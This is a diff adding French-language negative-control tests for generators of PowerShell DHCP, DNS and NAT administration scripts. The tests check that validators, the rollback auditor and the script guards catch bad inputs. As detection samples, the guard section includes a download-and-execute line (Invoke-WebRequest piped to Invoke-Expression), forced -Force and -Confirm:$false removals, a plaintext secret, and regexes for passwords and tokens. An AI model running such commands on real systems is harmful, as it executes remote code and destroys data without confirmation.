@@ -1651,6 +1651,197 @@ for (const outil of outilsLot2) {
   }
 }
 
+// ---------------------------------------------------------------------------
+// LOT 2 (8/n) — Contre-épreuves
+//
+// Un test qui ne peut pas échouer ne prouve rien. Chaque contrôle du lot est
+// donc soumis à un cas qui DOIT le faire échouer. Si l'une de ces
+// contre-épreuves passe, c'est le contrôle correspondant qui est défaillant,
+// pas le code testé.
+// ---------------------------------------------------------------------------
+section('LOT 2 — contre-épreuves : la validation détecte-t-elle vraiment ?');
+
+const outilEtendue = tools.find((t) => t.id === 'dhcp-scope-options');
+const baseEtendue = Object.fromEntries(outilEtendue.fields.map((f) => [f.id, String(f.default ?? '')]));
+
+const casEtendue = [
+  ['plage inversée', { scopeStart: '192.168.30.244', scopeEnd: '192.168.30.1' }, 'scopeStart|scopeEnd'],
+  ['première adresse hors du réseau', { scopeStart: '192.168.31.10' }, 'scopeStart|scopeEnd'],
+  ['adresse de réseau distribuée', { scopeStart: '192.168.30.0' }, 'scopeStart|scopeEnd'],
+  ['adresse de diffusion distribuée', { scopeEnd: '192.168.30.255' }, 'scopeStart|scopeEnd'],
+  ['réseau écrit comme une adresse d\u2019hôte', { scopeCidr: '192.168.30.7/24' }, 'scopeCidr'],
+  ['passerelle hors du réseau', { scopeGateway: '10.0.0.1' }, 'scopeGateway'],
+  ['passerelle comprise dans la plage distribuée', { scopeGateway: '192.168.30.100' }, 'scopeGateway'],
+  ['serveur DNS compris dans la plage distribuée', { scopeDns: '192.168.30.100' }, 'scopeDns'],
+  ['exclusion hors de la plage', { scopeExclStart: '192.168.30.245', scopeExclEnd: '192.168.30.250' }, 'scopeExclStart'],
+  ['durée de bail non entière', { scopeLease: '8,5' }, 'scopeLease'],
+  ['état d\u2019étendue inconnu', { scopeState: 'Peut-être' }, 'scopeState'],
+];
+
+for (const [nom, mutation, champsAttendus] of casEtendue) {
+  const valeurs = { ...baseEtendue, ...mutation };
+  const errors = outilEtendue.validate(valeurs);
+  const cles = Object.keys(errors);
+  assert(cles.length > 0, `contre-épreuve détectée — ${nom}`);
+  assert(cles.some((c) => new RegExp(champsAttendus).test(c)),
+    `contre-épreuve — ${nom} : l\u2019erreur porte sur le bon champ (${cles.join(', ')})`);
+  let leve = false;
+  try { outilEtendue.generate(valeurs); } catch { leve = true; }
+  assert(leve, `contre-épreuve — ${nom} : aucun script n\u2019est produit`);
+}
+
+// Contrôle POSITIF : les valeurs d'exemple du laboratoire doivent, elles, passer.
+assert(Object.keys(outilEtendue.validate(baseEtendue)).length === 0,
+  'contrôle positif : l\u2019exemple de laboratoire 192.168.30.0/24 est accepté');
+
+const outilReservation = tools.find((t) => t.id === 'dhcp-reservation');
+const baseReservation = Object.fromEntries(outilReservation.fields.map((f) => [f.id, String(f.default ?? '')]));
+for (const [nom, mutation, champ] of [
+  ['adresse hors de l\u2019étendue', { resIp: '192.168.40.50' }, 'resIp'],
+  ['ScopeId incorrect', { resScopeId: 'scope-1' }, 'resScopeId'],
+  ['MAC trop courte', { resClient: '00-15-5D-01-2A' }, 'resClient'],
+  ['MAC non hexadécimale', { resClient: '00-15-5D-01-2A-ZZ' }, 'resClient'],
+  ['type de réservation inconnu', { resType: 'Autre' }, 'resType'],
+]) {
+  const valeurs = { ...baseReservation, ...mutation };
+  const errors = outilReservation.validate(valeurs);
+  assert(errors[champ], `contre-épreuve détectée — ${nom} (champ ${champ})`);
+}
+assert(Object.keys(outilReservation.validate(baseReservation)).length === 0,
+  'contrôle positif : la réservation d\u2019exemple est acceptée');
+
+const outilSauvegarde = tools.find((t) => t.id === 'dhcp-backup');
+const baseSauvegarde = Object.fromEntries(outilSauvegarde.fields.map((f) => [f.id, String(f.default ?? '')]));
+const errUnc = outilSauvegarde.validate({ ...baseSauvegarde, bkFolder: '\\\\serveur\\sauvegardes' });
+assert(errUnc.bkFolder && /UNC|réseau/.test(errUnc.bkFolder),
+  'contre-épreuve détectée — chemin UNC refusé pour la sauvegarde DHCP');
+
+const outilZone = tools.find((t) => t.id === 'dns-zone');
+const baseZone = Object.fromEntries(outilZone.fields.map((f) => [f.id, String(f.default ?? '')]));
+for (const [nom, mutation, champ] of [
+  ['zone inversée sans notation CIDR', { zoneType: 'Inversée', zoneName: 'hopitalbn.lan' }, 'zoneName'],
+  ['nom de zone avec espace', { zoneName: 'zone invalide' }, 'zoneName'],
+  ['mises à jour sécurisées sur zone fichier', { zoneStorage: 'Fichier', zoneUpdates: 'Secure' }, 'zoneUpdates'],
+  ['étendue de réplication inconnue', { zoneReplication: 'Univers' }, 'zoneReplication'],
+]) {
+  const errors = outilZone.validate({ ...baseZone, ...mutation });
+  assert(errors[champ], `contre-épreuve détectée — ${nom} (champ ${champ})`);
+}
+
+const outilEnregistrement = tools.find((t) => t.id === 'dns-record');
+const baseEnregistrement = Object.fromEntries(outilEnregistrement.fields.map((f) => [f.id, String(f.default ?? '')]));
+for (const [nom, mutation, champ] of [
+  ['type MX hors périmètre', { recType: 'MX' }, 'recType'],
+  ['PTR dans une zone directe', { recType: 'PTR', recZone: 'hopitalbn.lan' }, 'recZone'],
+  ['enregistrement A dans une zone inversée', { recType: 'A', recZone: '30.168.192.in-addr.arpa' }, 'recZone'],
+  ['adresse IPv4 invalide pour un type A', { recIPv4: '192.168.30.300' }, 'recIPv4'],
+  ['adresse IPv6 invalide pour un type AAAA', { recType: 'AAAA', recIPv6: '2001:db8::1::2' }, 'recIPv6'],
+  ['cible CNAME non qualifiée', { recType: 'CNAME', recTarget: 'srv' }, 'recTarget'],
+]) {
+  const errors = outilEnregistrement.validate({ ...baseEnregistrement, ...mutation });
+  assert(errors[champ], `contre-épreuve détectée — ${nom} (champ ${champ})`);
+}
+
+const outilIcs = tools.find((t) => t.id === 'ics-readiness');
+const baseIcs = Object.fromEntries(outilIcs.fields.map((f) => [f.id, String(f.default ?? '')]));
+const errIcs = outilIcs.validate({ ...baseIcs, icsExternal: baseIcs.icsInternal });
+assert(errIcs.icsExternal, 'contre-épreuve détectée — carte interne et carte Internet identiques (ICS)');
+
+const outilRras = tools.find((t) => t.id === 'rras-nat-readiness');
+const baseRras = Object.fromEntries(outilRras.fields.map((f) => [f.id, String(f.default ?? '')]));
+const errRras = outilRras.validate({ ...baseRras, rrasExternal: baseRras.rrasInternal });
+assert(errRras.rrasExternal, 'contre-épreuve détectée — interfaces interne et externe identiques (RRAS)');
+
+section('LOT 2 — contre-épreuves : l\u2019audit de sécurité détecte-t-il vraiment ?');
+
+// Outils fictifs, construits uniquement pour faire échouer l'auditeur.
+const outilFictif = (rollback) => ({ id: 'outil-fictif', rollback });
+
+const casAudit = [
+  ['-Confirm:$false dans la procédure normale',
+    { summary: 's', diagnostic: 'Get-DhcpServerv4Scope', command: 'Remove-DhcpServerv4Scope -ScopeId x -Confirm:$false', exceptional: '' },
+    /-Confirm:\$false/],
+  ['-Force dans la procédure normale',
+    { summary: 's', diagnostic: 'Get-SmbShare', command: 'Remove-SmbShare -Name x -Force', exceptional: '' },
+    /-Force/],
+  ['commande destructrice sans confirmation',
+    { summary: 's', diagnostic: 'Get-DnsServerZone', command: 'Remove-DnsServerZone -Name x', exceptional: '' },
+    /aucune confirmation/],
+  ['modification dans le bloc diagnostic',
+    { summary: 's', diagnostic: 'Remove-DhcpServerv4Reservation -ScopeId x -ClientId y', command: 'Get-DhcpServerv4Reservation', exceptional: '' },
+    /bloc diagnostic/],
+  ['bloc exceptionnel sensible sans avertissement critique',
+    { summary: 's', diagnostic: 'Get-Service', command: 'Get-Service', exceptional: 'Uninstall-WindowsFeature -Name DHCP -Confirm\nhttps://learn.microsoft.com/x' },
+    /AVERTISSEMENT CRITIQUE/],
+  ['bloc exceptionnel sans renvoi à une procédure officielle',
+    { summary: 's', diagnostic: 'Get-Service', command: 'Get-Service', exceptional: 'AVERTISSEMENT CRITIQUE\nUninstall-WindowsFeature -Name DHCP -Confirm' },
+    /procédure Microsoft officielle/],
+];
+
+for (const [nom, rollback, motif] of casAudit) {
+  const pbs = auditerAnnulation(outilFictif(rollback));
+  assert(pbs.length > 0, `contre-épreuve détectée par l\u2019auditeur — ${nom}`);
+  assert(pbs.some((p) => motif.test(p)),
+    `contre-épreuve — ${nom} : le message nomme la règle enfreinte (${pbs.join(' | ')})`);
+}
+
+// Contrôle POSITIF : les 22 outils réels passent l'auditeur.
+const problemesReels = tools.flatMap((t) => auditerAnnulation(t));
+assert(problemesReels.length === 0,
+  `contrôle positif : les ${tools.length} outils passent l\u2019audit d\u2019annulation (${problemesReels.join(' | ')})`);
+
+section('LOT 2 — contre-épreuves : les gardes de script et de rapport');
+
+// Le contrôle « aucun -Force » doit réagir sur un script fabriqué qui en contient un.
+const scriptFautif = '#Requires -Version 5.1\nRemove-Item C:\\x -Force\n';
+assert(/(^|\s)-Force\b/i.test(scriptFautif),
+  'contre-épreuve — le motif de détection de -Force reconnaît un script fautif');
+const scriptConfirmFalse = 'Remove-DhcpServerv4Scope -ScopeId x -Confirm:$false';
+assert(/-Confirm\s*:\s*\$false/i.test(scriptConfirmFalse),
+  'contre-épreuve — le motif de détection de -Confirm:$false reconnaît un script fautif');
+const scriptTelechargement = 'Invoke-WebRequest https://exemple/x.ps1 | Invoke-Expression';
+assert(/Invoke-Expression/i.test(scriptTelechargement) && /Invoke-WebRequest/i.test(scriptTelechargement),
+  'contre-épreuve — les motifs de téléchargement et d\u2019exécution dynamique reconnaissent un script fautif');
+const scriptSecret = "$MotDePasse = ConvertTo-SecureString 'x' -AsPlainText -Force";
+assert(/ConvertTo-SecureString|PlainText/i.test(scriptSecret),
+  'contre-épreuve — le motif de détection de secrets reconnaît un script fautif');
+
+// Aucun script réel ne contient ces motifs.
+for (const outil of outilsLot2) {
+  const valeurs = Object.fromEntries(outil.fields.map((f) => [f.id, String(f.default ?? '')]));
+  const script = outil.generate(valeurs);
+  assert(!/(^|\s)-Force\b/i.test(script) && !/-Confirm\s*:\s*\$false/i.test(script)
+      && !/Invoke-Expression/i.test(script) && !/ConvertTo-SecureString|PlainText/i.test(script),
+    `contrôle positif : ${outil.id} ne contient aucun de ces motifs`);
+}
+
+// Un rapport ne doit jamais exporter de donnée sensible : le bloc d'export ne
+// référence que des variables de contexte, jamais un champ de mot de passe.
+const blocRapportReel = blocExportRapport({ prefixeFichier: 'kjemo-essai' });
+const motifsSensibles = [/password/i, /motdepasse/i, /credential/i, /token/i, /secret/i, /Get-Content.*\\.txt/i];
+for (const motif of motifsSensibles) {
+  assert(!motif.test(blocRapportReel),
+    `contre-épreuve — le bloc de rapport ne contient rien qui corresponde à ${motif}`);
+}
+
+section('LOT 2 — contre-épreuve : la garde d\u2019identité des scripts historiques');
+
+// Le fichier de référence protège les 64 scripts historiques. Si une empreinte
+// était absente ou fausse, la garde devrait le voir : on le vérifie ici sur une
+// copie modifiée du fichier, sans toucher au vrai.
+const baseline = JSON.parse(readFileSync(resolve(ROOT, 'test/scripts-baseline.json'), 'utf8'));
+assert(baseline.count === 64 && Object.keys(baseline.sha256).length === 64,
+  'la référence couvre exactement les 64 scripts historiques');
+assert(baseline.baseSha === '22b4eadbaf0771d13e5d8f5d66d72881e4a4d8c6',
+  'la référence est bien ancrée au SHA de base du LOT 1B');
+const empreinteFausse = { ...baseline.sha256 };
+const premierFichier = Object.keys(empreinteFausse)[0];
+empreinteFausse[premierFichier] = '0'.repeat(64);
+assert(empreinteFausse[premierFichier] !== baseline.sha256[premierFichier],
+  `contre-épreuve — une empreinte modifiée diffère de la référence (${premierFichier})`);
+assert(Object.keys(baseline.sha256).every((f) => /^[a-z0-9-]+__[a-z0-9-]+\.ps1$/.test(f)),
+  'chaque entrée de la référence nomme un script <outil>__<jeu>.ps1');
+
 // Résumé
 console.log('');
 console.log(`Tests d'identité terminés : ${passed} OK, ${failed} ÉCHEC(S).`);
